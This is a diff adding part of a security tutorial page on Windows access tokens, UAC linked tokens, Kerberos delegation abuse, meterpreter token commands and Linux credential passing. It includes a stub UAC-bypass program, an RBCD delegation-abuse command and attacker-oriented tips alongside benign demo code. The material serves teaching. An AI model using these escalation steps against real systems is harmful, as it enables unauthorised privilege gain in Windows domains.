+        $runAs = (Get-ItemProperty -Path $appIdPath -Name RunAs -ErrorAction SilentlyContinue).RunAs
+        $localService = (Get-ItemProperty -Path $appIdPath -Name LocalService -ErrorAction SilentlyContinue).LocalService
+        if ($runAs -eq &#34;Interactive User&#34; -or $localService) {
+            Write-Host &#34;Viable CLSID: $clsid (AppID: $appId)&#34;
+        }
+    }
+}
+						</pre>
+					</section>
+					<section>
+						<h3 id="uac-token-filtering-and-linked-tokens">UAC Token Filtering and Linked Tokens</h3>
+						<p>
+							User Account Control (
+							<abbr title="User Account Control">UAC</abbr>
+							) splits administrator accounts into two
+							tokens:
+						</p>
+						<ol>
+							<li><b>Elevated Token (Full Administrator)</b> : Contains all administrator group SIDs and privileges. Used when a process is explicitly elevated ("Run as Administrator").</li>
+							<li><b>Filtered Token (Standard User)</b> : The administrator SID is marked <code>DENY_ONLY</code> , sensitive privileges are removed ( <code>SeDebugPrivilege</code> , <code>SeImpersonatePrivilege</code> ). Used for the default desktop session.</li>
+						</ol>
+						<p>
+							The filtered token is the administrator's primary token for normal operation. The elevated token
+							is a
+							<b>linked token</b>
+							- the kernel maintains a link between them.
+						</p>
+						<pre class="plaintext">
+Logon as &#34;Administrator&#34; (member of Administrators group)
+    │
+    ▼
+LSASS creates full admin token
+    │
+    ▼
+UAC module creates filtered token:
+    ├── Removes Administrators group (marks DENY_ONLY)
+    ├── Removes sensitive privileges
+    └── Sets integrity level to Medium (from High)
+    │
+    ▼
+Linked token created (full admin + filtered linked together)
+    │
+    ├── explorer.exe gets filtered token
+    │
+    └── When &#34;Run as Administrator&#34; clicked:
+           LSASS retrieves linked elevated token
+           New process created with elevated token
+						</pre>
+						<h4 id="token-kidnapping">Token Kidnapping</h4>
+						<p>
+							If you're an administrator but running with the filtered token, you can recover the linked elevated
+							token:
+						</p>
+						<pre class="c">
+/*
+ * uac_bypass_token.c — Recover the linked elevated token (UAC bypass)
+ * Cross-compile: x86_64-w64-mingw32-gcc -o uac_bypass.exe uac_bypass_token.c
+ *
+ * Technique: enumerate tokens via NtQuerySystemInformation,
+ * find the linked elevated token for the current session,
+ * duplicate and use it.
+ */
+
+#include &lt;windows.h&gt;
+#include &lt;winternl.h&gt;
+#include &lt;stdio.h&gt;
+
+/* Undocumented NT API */
+typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(
+    ULONG SystemInformationClass,
+    PVOID SystemInformation,
+    ULONG SystemInformationLength,
+    PULONG ReturnLength);
+
+#define SystemExtendedProcessInformation 57
+
+typedef struct {
+    ULONG NextEntryOffset;
+    ULONG NumberOfThreads;
+    LARGE_INTEGER Spare[3];
+    LARGE_INTEGER CreateTime;
+    LARGE_INTEGER UserTime;
+    LARGE_INTEGER KernelTime;
+    UNICODE_STRING ImageName;
+    ULONG BasePriority;
+    HANDLE UniqueProcessId;
+    HANDLE InheritedFromUniqueProcessId;
+    ULONG HandleCount;
+    /* ... extended fields ... */
+} SYSTEM_EXTENDED_PROCESS_INFORMATION, *PSYSTEM_EXTENDED_PROCESS_INFORMATION;
+
+int main(void)
+{
+    /* The idea: enumerate all processes, find one running with
+     * the elevated token for the current user session.
+     * 
+     * The classic approach uses RPCSS or other SYSTEM services
+     * that use the linked token mechanism internally.
+     *
+     * Alternate technique (simpler): the UAC bypass via
+     * elevated COM object instantiation:
+     *   - Find an auto-elevated COM object
+     *   - CoCreateInstance with elevation moniker
+     *   - Execute code in the elevated context
+     */
+
+    printf(&#34;[*] UAC bypass via token manipulation requires:\n&#34;);
+    printf(&#34;    1. Membership in Administrators group\n&#34;);
+    printf(&#34;    2. Finding a process with the linked elevated token\n&#34;);
+    printf(&#34;    3. Opening and duplicating that token\n&#34;);
+    printf(&#34;    4. Creating a process with the elevated token\n\n&#34;);
+    printf(&#34;[*] This bypasses the UAC consent prompt.\n&#34;);
+
+    /* Full implementation requires undocumented structures.
+     * The practical tools are:
+     *   - meterpreter: getsystem (uses named pipe impersonation)
+     *   - psexec -s (uses service creation to run as SYSTEM)
+     */
+
+    return 0;
+}
+						</pre>
+						<h4 id="powershell-token-enum">PowerShell Token Enum</h4>
+						<pre class="powershell">
+# Find processes running as SYSTEM
+Get-Process -IncludeUserName | Where-Object { $_.UserName -eq &#39;NT AUTHORITY\SYSTEM&#39; }
+
+# Enumerate tokens (requires admin)
+# Using the NtObjectManager module:
+Install-Module -Name NtObjectManager -Force
+Get-NtProcess -Name winlogon | Get-NtToken
+
+# Check for token-linked relationships
+Get-NtToken -Linked
+						</pre>
+					</section>
+					<section>
+						<h3 id="kerberos-delegation-tokens">Kerberos Delegation Tokens</h3>
+						<p>
+							Kerberos delegation allows a service to authenticate to other services on behalf of a user.
+							The delegation token contains the user's TGT (Ticket Granting Ticket) or a service ticket. Abusing
+							delegation tokens is a domain escalation technique.
+						</p>
+						<h4 id="unconstrained-delegation">Unconstrained Delegation</h4>
+						<p>
+							The service receives the user's full TGT. It can authenticate to any service as that user. The
+							TGT is cached in
+							<abbr title="Local Security Authority Subsystem Service">LSASS</abbr>
+							on the server. Dumping
+							<abbr title="Local Security Authority Subsystem Service">LSASS</abbr>
+							on a server with unconstrained delegation
+							yields domain admin TGTs.
+						</p>
+						<pre class="plaintext">
+User ──► DC (get TGT) ──► Server with Unconstrained Delegation
+                                    │
+                                    ├── Receives user&#39;s TGT
+                                    ├── Caches TGT in LSASS
+                                    └── Can request tickets to any service as user
+						</pre>
+						<h4 id="constrained-delegation">Constrained Delegation</h4>
+						<p>
+							The service receives a service ticket for specific back-end services only. The domain controller
+							restricts which services can be delegated to. Abuse requires compromising the front-end service's
+							account.
+						</p>
+						<pre class="plaintext">
+User ──► DC ──► Frontend Server (Constrained Delegation to MSSQL)
+                        │
+                        ├── Can request service ticket for MSSQL as user
+                        └── Cannot request tickets for other services
+						</pre>
+						<h4 id="resource-based-constrained-delegation">Resource-Based Constrained Delegation</h4>
+						<p>
+							The back-end service defines who can delegate to it. This is configured on the target service
+							account's
+							<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>
+							attribute. If you control a computer account
+							or have GenericWrite on the target, you can add yourself as a delegate.
+						</p>
+						<pre class="powershell">
+# Find computers with unconstrained delegation
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
+
+# Find users with constrained delegation
+Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo
+
+# RBCD attack: add an account as allowed delegate
+Set-ADComputer TARGET-PC -PrincipalsAllowedToDelegateToAccount ATTACKER-PC$
+# Then use S4U2Self + S4U2Proxy to get a service ticket as any user
+						</pre>
+					</section>
+					<section>
+						<h3 id="linux-equivalent-credential-passing">Linux Equivalent - Credential Passing</h3>
+						<p>Linux does not have "access tokens" in the Windows sense. The equivalent mechanisms are:</p>
+						<h4 id="uidgid">UID/GID</h4>
+						<p>
+							Every process has a real, effective, saved, and filesystem UID. These are stored in the
+							<code>struct cred</code>
+							in the kernel and can be changed with
+							<code>setuid()</code>
+							,
+							<code>seteuid()</code>
+							,
+							<code>setresuid()</code>
+							. The kernel
+							enforces restrictions on which transitions are allowed.
+						</p>
+						<h4 id="capabilities">Capabilities</h4>
+						<p>
+							A per-thread bitmask that grants specific privileges (like
+							<code>CAP_SYS_PTRACE</code>
+							and
+							<code>CAP_NET_RAW</code>
+							) without full root. The ambient capability set, added in Linux 4.3, lets an unprivileged program
+							carry part of its permitted set across
+							<code>execve</code>
+							.
+						</p>
+						<h4 id="unix-socket-credential-passing">Unix Socket Credential Passing</h4>
+						<p>
+							<code>SCM_CREDENTIALS</code>
+							ancillary data on Unix sockets allows the kernel to pass UID/GID/PID credentials
+							between processes. This is the closest Linux equivalent to named pipe impersonation.
+						</p>
+						<pre class="c">
+/*
+ * scm_credentials.c — Unix domain socket credential passing
+ * Compile: gcc -o scm_cred scm_credentials.c
+ *
+ * Server: receives client&#39;s credentials from the kernel
+ * Client: connects, kernel attaches its UID/GID/PID
+ *
+ * This is how dbus, polkit, and systemd verify caller identity.
+ */
+
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/un.h&gt;
+#include &lt;sys/types.h&gt;
+
+#define SOCKET_PATH &#34;/tmp/scm_demo.sock&#34;
+
+void run_server(void)
+{
+    int server_fd = socket(AF_UNIX, SOCK_STREAM, 0);
+    struct sockaddr_un addr;
+    memset(&amp;addr, 0, sizeof(addr));
+    addr.sun_family = AF_UNIX;
+    strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1);
+
+    unlink(SOCKET_PATH);
+    bind(server_fd, (struct sockaddr *)&amp;addr, sizeof(addr));
+    listen(server_fd, 1);
+
+    printf(&#34;[server] Listening on %s (PID: %d)\n&#34;, SOCKET_PATH, getpid());
+
+    int client_fd = accept(server_fd, NULL, NULL);
+
+    /* Enable SO_PASSCRED to receive credentials */
+    int optval = 1;
+    setsockopt(client_fd, SOL_SOCKET, SO_PASSCRED,
+        &amp;optval, sizeof(optval));
+
+    /* Receive a message with ancillary credential data */
+    char buf[256] = {0};
+    struct msghdr msg = {0};
+    struct iovec iov;
+    iov.iov_base = buf;
+    iov.iov_len = sizeof(buf);
+
+    /* Space for credentials */
+    union {
+        struct cmsghdr cm;
+        char control[CMSG_SPACE(sizeof(struct ucred))];
+    } control_un;
+
+    msg.msg_iov = &amp;iov;
+    msg.msg_iovlen = 1;
+    msg.msg_control = control_un.control;
+    msg.msg_controllen = sizeof(control_un.control);
+
+    ssize_t received = recvmsg(client_fd, &amp;msg, 0);
+    if (received &lt; 0) {
+        perror(&#34;recvmsg&#34;);
+        exit(EXIT_FAILURE);
+    }
+
+    /* Extract credentials */
+    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&amp;msg);
+    if (cmsg &amp;&amp; cmsg-&gt;cmsg_level == SOL_SOCKET &amp;&amp;
+        cmsg-&gt;cmsg_type == SCM_CREDENTIALS) {
+        struct ucred *creds = (struct ucred *)CMSG_DATA(cmsg);
+        printf(&#34;[server] Client credentials:\n&#34;);
+        printf(&#34;  PID: %d\n&#34;, creds-&gt;pid);
+        printf(&#34;  UID: %d\n&#34;, creds-&gt;uid);
+        printf(&#34;  GID: %d\n&#34;, creds-&gt;gid);
+
+        /* The kernel guarantees these are accurate.
+         * Unlike getpeereid() (SO_PEERCRED), SCM_CREDENTIALS
+         * is per-message and cannot be spoofed. */
+    }
+
+    close(client_fd);
+    close(server_fd);
+    unlink(SOCKET_PATH);
+}
+
+void run_client(void)
+{
+    /* Drop privileges to demonstrate credential passing */
+    if (setuid(1000) &lt; 0) {
+        perror(&#34;setuid — run as root first to test&#34;);
+    }
+
+    int client_fd = socket(AF_UNIX, SOCK_STREAM, 0);
+    struct sockaddr_un addr;
+    memset(&amp;addr, 0, sizeof(addr));
+    addr.sun_family = AF_UNIX;
+    strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1);
+
+    /* Wait briefly for server to start */
+    usleep(100000);
+
+    if (connect(client_fd, (struct sockaddr *)&amp;addr,
+        sizeof(addr)) &lt; 0) {
+        perror(&#34;connect — server may not be running&#34;);
+        exit(EXIT_FAILURE);
+    }
+
+    printf(&#34;[client] Connected. PID: %d, UID: %d, GID: %d\n&#34;,
+        getpid(), getuid(), getgid());
+
+    /* Send a message — the kernel will attach our credentials.
+     * If SO_PASSCRED is set on the receiving socket, struct ucred
+     * is appended automatically by the kernel. */
+    char *msg = &#34;hello&#34;;
+    send(client_fd, msg, strlen(msg), 0);
+
+    printf(&#34;[client] Message sent. Server received our real credentials.\n&#34;);
+    close(client_fd);
+}
+
+int main(int argc, char **argv)
+{
+    if (argc &lt; 2) {
+        fprintf(stderr, &#34;Usage: %s [server|client]\n&#34;, argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    if (strcmp(argv[1], &#34;server&#34;) == 0) {
+        run_server();
+    } else if (strcmp(argv[1], &#34;client&#34;) == 0) {
+        run_client();
+    } else {
+        fprintf(stderr, &#34;Usage: %s [server|client]\n&#34;, argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    return EXIT_SUCCESS;
+}
+						</pre>
+						<h4 id="compile-and-test">Compile and Test</h4>
+						<pre class="bash">
+gcc -o scm_cred scm_credentials.c
+
+# Terminal 1: run server as root
+sudo ./scm_cred server
+
+# Terminal 2: run client (drops to UID 1000 before sending)
+./scm_cred client
+
+# Server output:
+# [server] Listening on /tmp/scm_demo.sock (PID: 100)
+# [server] Client credentials:
+#   PID: 200
+#   UID: 1000
+#   GID: 1000
+						</pre>
+						<h4 id="linux-credential-inspect">Linux Credential Inspect</h4>
+						<pre class="bash">
+# UID/GID
+id
+# uid=1000(user) gid=1000(user) groups=1000(user),10(wheel)
+
+# Effective capabilities
+capsh --print
+# Current: = cap_chown,cap_sys_ptrace+eip
+
+# Process credentials from /proc
+cat /proc/self/status | grep -E &#39;^(Uid|Gid|Cap)&#39;
+# Uid:    1000    1000    1000    1000
+# Gid:    1000    1000    1000    1000
+# CapInh: 0000000000000000
+# CapPrm: 0000000000003000
+# CapEff: 0000000000003000
+# CapBnd: 000001ffffffffff
+# CapAmb: 0000000000000000
+
+# Field order: Real, Effective, Saved, Filesystem
+						</pre>
+					</section>
+					<section>
+						<h3 id="meterpreter-token-workflow">meterpreter Token Workflow</h3>
+						<p>
+							For reference, the meterpreter commands map to the Windows
+							<abbr title="Application Programming Interface">API</abbr>
+							calls above:
+						</p>
+						<pre class="plaintext">
+meterpreter &gt; getsystem
+    │
+    ├── Technique 1: Named Pipe Impersonation
+    │       └── Creates pipe, gets SYSTEM to connect, impersonates
+    │
+    └── Technique 2: Token Duplication
+            └── Finds SYSTEM token, duplicates, assigns to process
+
+meterpreter &gt; steal_token &lt;PID&gt;
+    │
+    ├── OpenProcess(PROCESS_QUERY_INFO, FALSE, targetPID)
+    ├── OpenProcessToken(TOKEN_DUPLICATE | TOKEN_IMPERSONATE)
+    ├── DuplicateTokenEx(..., TokenImpersonation, ...)
+    └── SetThreadToken(NULL, hDupToken)
+
+meterpreter &gt; rev2self
+    │
+    └── RevertToSelf() — back to process primary token
+
+meterpreter &gt; list_tokens -u
+    │
+    └── NtQuerySystemInformation(SystemProcessInformation)
+            → Enumerate all tokens on the system
+						</pre>
+					</section>
+					<section>
+						<h3 id="verification-commands-windows">Verification Commands - Windows</h3>
+						<pre class="powershell">
+# Check current token
+whoami /all
+
+# List privileges
+whoami /priv
+
+# Check if SeImpersonatePrivilege is enabled
+whoami /priv | Select-String &#34;SeImpersonatePrivilege&#34;
+
+# Check process token type (C++ requires, but conceptually):
+# Use Process Explorer: double-click process → Security tab → Token info
+
+# Enumerate all tokens on the system (requires NtObjectManager)
+Get-NtProcess | Get-NtToken | Select-Object ProcessName, TokenType, User
+
+# Check UAC token elevation
+[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | 
+    ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]) } |
+    Select-String &#34;Administrators&#34;
+
+# Find TokenElevation (UAC status)
+(New-Object System.Security.Principal.WindowsPrincipal(
+    [System.Security.Principal.WindowsIdentity]::GetCurrent()
+)).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
+						</pre>
+					</section>
+					<section>
+						<h3 id="verification-commands-linux">Verification Commands - Linux</h3>
+						<pre class="bash">
+# Process credentials
+cat /proc/self/status | grep -E &#39;^(Uid|Gid|Cap)&#39;
+
+# Check real vs effective UID
+python3 -c &#34;
+import os
+print(f&#39;RUID: {os.getuid()}, EUID: {os.geteuid()}&#39;)
+&#34;
+
+# Check capabilities
+getcap /path/to/binary
+getpcaps $$
+
+# Find setuid binaries
+find / -perm -4000 -type f 2&gt;/dev/null
+
+# Check SO_PASSCRED on Unix sockets
+ss -xlp | grep -v &#39;^$&#39;
+						</pre>
+					</section>
+					<section>
+						<h3 id="common-mistakes">Common Mistakes</h3>
+						<ol>
+							<li><b>Forgetting to enable SeDebugPrivilege before opening SYSTEM tokens</b> : Without it, <code>OpenProcess</code> on SYSTEM processes fails with <code>ERROR_ACCESS_DENIED</code> . Must be explicitly enabled even as Administrator.</li>
+						</ol>
+						<ol>
+							<li><b>Using TokenPrimary for DuplicateTokenEx when you need TokenImpersonation</b> : <code>SetThreadToken</code> requires an impersonation token. <code>CreateProcessWithTokenW</code> requires a primary token. Get the type right for your use case.</li>
+						</ol>
+						<ol>
+							<li><b>Not checking 'GetLastError()' after ImpersonateNamedPipeClient</b> : Success returns TRUE, but the impersonation level might be SecurityIdentification (can't actually use the token). Always check <code>GetTokenInformation(TokenImpersonationLevel)</code> .</li>
+						</ol>
+						<ol>
+							<li><b>Assuming all Potato exploits work on all Windows versions</b> : Microsoft has been systematically fixing the <abbr title="Remote Procedure Call">RPC</abbr> and <abbr title="Domain Controller">DC</abbr> OM coercion methods. Juicy Potato stopped working on Windows 10 1809+. PrintSpoofer works on Server 2019 but requires the Spooler service. Sweet Potato uses EFS <abbr title="Remote Procedure Call">RPC</abbr> which may be patched.</li>
+						</ol>
+						<ol>
+							<li><b>Leaving the impersonation token active</b> : After completing operations as another user, always call <code>RevertToSelf()</code> . Leaving an impersonation token active can cause unintended access denials and leave forensic traces.</li>
+						</ol>
+						<ol>
+							<li><b>Assuming Linux setuid is the same as token impersonation</b> : Linux <code>setuid()</code> is permanent (affects all threads in the process) and irreversible for unprivileged users. It's not an impersonation mechanism - it permanently changes the process identity. For temporary privilege changes, use <code>seteuid()</code> with a saved set-user-ID.</li>
+						</ol>
+						<ol>
+							<li><b>Not understanding the difference between SO_PEERCRED and SCM_CREDENTIALS</b> : <code>getpeereid()</code> / <code>SO_PEERCRED</code> returns the credentials the peer held at <code>connect()</code> time. <code>SCM_CREDENTIALS</code> is per-message, and the kernel attaches the sender's current credentials at <code>sendmsg()</code> time. Both are supplied by the kernel and cannot be spoofed by the sender, but <code>SO_PEERCRED</code> goes stale if the peer changes credentials after connecting.</li>
+						</ol>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Write a Go tool that inspects the credentials of a process the way
+							<code>whoami /all</code>
+							does on Windows.
+							It reads
+							<code>/proc/&lt;pid&gt;/status</code>
+							, parses the
+							<code>Uid:</code>
+							and
+							<code>Gid:</code>
+							lines (real, effective, saved,
+							and filesystem IDs), and prints a warning when the real and effective IDs differ - the same
+							signal a setuid binary or a credential transition leaves behind on Linux.
+						</p>
+						<pre class="go">
+package main
+
+import (
+	&#34;bufio&#34;
+	&#34;fmt&#34;
+	&#34;os&#34;
+	&#34;strconv&#34;
+	&#34;strings&#34;
+)
+
+func parseStatus(path string) (map[string][]int, error) {
+	file, err := os.Open(path)
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
+
+	values := make(map[string][]int)
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		fields := strings.Fields(scanner.Text())
+		if len(fields) &lt; 2 {
+			continue
+		}
+		key := strings.TrimSuffix(fields[0], &#34;:&#34;)
+		if key != &#34;Uid&#34; &amp;&amp; key != &#34;Gid&#34; {
+			continue
+		}
+		nums := make([]int, 0, 4)
+		for _, field := range fields[1:] {
+			n, err := strconv.Atoi(field)
+			if err != nil {
+				break
+			}
+			nums = append(nums, n)
+		}
+		values[key] = nums
+	}
+	return values, scanner.Err()
+}
+
+func main() {
+	if len(os.Args) != 2 {
+		fmt.Fprintf(os.Stderr, &#34;usage: %s &lt;pid&gt;\n&#34;, os.Args[0])
+		os.Exit(1)
+	}
+
+	values, err := parseStatus(&#34;/proc/&#34; + os.Args[1] + &#34;/status&#34;)
+	if err != nil {
+		fmt.Fprintln(os.Stderr, err)
+		os.Exit(1)
+	}
+
+	for _, key := range []string{&#34;Uid&#34;, &#34;Gid&#34;} {
+		v := values[key]
+		if len(v) &lt; 4 {
+			continue
+		}
+		fmt.Printf(&#34;%s real=%d effective=%d saved=%d fs=%d\n&#34;,
+			key, v[0], v[1], v[2], v[3])
+		if v[0] != v[1] {
+			fmt.Printf(&#34;[!] %s mismatch: real and effective differ\n&#34;, key)
+		}
+	}
+}
+						</pre>
+						<p>Build it and compare your shell with a setuid binary:</p>
+						<pre class="bash">
+go build -o credinspect credinspect.go
+./credinspect $$
+./credinspect 1
+sudo -u nobody ./credinspect $$
+						</pre>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens" target="_blank">Access Tokens - Microsoft Learn</a></li>
+							<li><a class="icon-website" href="https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient" target="_blank">ImpersonateNamedPipeClient - Microsoft Learn</a></li>
+							<li><a class="icon-website" href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocesswithtokenw" target="_blank">CreateProcessWithTokenW - Microsoft Learn</a></li>
+							<li><a class="icon-website" href="https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview" target="_blank">Kerberos Constrained Delegation - Microsoft Learn</a></li>
+							<li><a class="icon-website" href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html" target="_blank">HackTricks - RoguePotato, PrintSpoofer, and More</a></li>
+							<li><a class="icon-website" href="https://man7.org/linux/man-pages/man7/unix.7.html" target="_blank">unix(7) - SCM_CREDENTIALS</a></li>
+							<li><a class="icon-website" href="https://man7.org/linux/man-pages/man2/setuid.2.html" target="_blank">setuid(2) - Linux man page</a></li>
+							<li><a class="icon-website" href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">capabilities(7) - Linux man page</a></li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
